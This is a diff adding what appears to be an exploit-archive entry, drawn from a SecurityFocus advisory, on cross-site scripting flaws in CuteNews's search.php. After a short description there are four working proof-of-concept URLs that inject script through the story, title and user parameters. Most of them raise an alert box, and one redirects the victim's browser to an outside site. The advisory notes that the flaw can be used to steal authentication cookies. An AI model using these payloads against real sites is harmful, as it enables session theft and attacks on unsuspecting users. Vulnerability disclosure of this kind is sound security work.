@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/17850/info
+
+CuteNews is prone to multiple cross-site scripting vulnerabilities. These issues are due to the application's failure to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+http://www.example.comsearch.php?dosearch=yes&story=%22%3E%3Cscript%3Ealert%28%22NST+PoC+by+K4P0%22%29%3B%3C%2Fscript%3E&title=&user=&from_date_day=&from_date_month=&from_date_year=&to_date_day=&to_date_month=&to_date_year=
+
+http://www.example.comsearch.php?dosearch=yes&title=%22%3E%3Cscript%3Ealert(%22NST%20PoC%20by%20K4P0%22  );%3C/script%3E&user=&from_date_day=&from_date_month=&from_date_year=&to_date_day  =&to_date_month=&to_date_year=
+
+http://www.example.comsearch.php?dosearch=yes&story=K4P0&user=%22%3E%3Cscript%3Ealert(%22NST%20PoC%20by%20K4P0%22);%3C/script%3E&from_date_day=&from_date_month=&from_date_year=&to_date_day=&to_date_month=&to_date_year=
+
+http://www.example.comsearch.php?dosearch=yes&title="><script>window.location=&#039;http://www.neosecurityteam.net/&#039;;</script>&user=&from_date_day=&from_date_month=&from_date_year=&to_date_day=&to_date_month=&to_date_year=
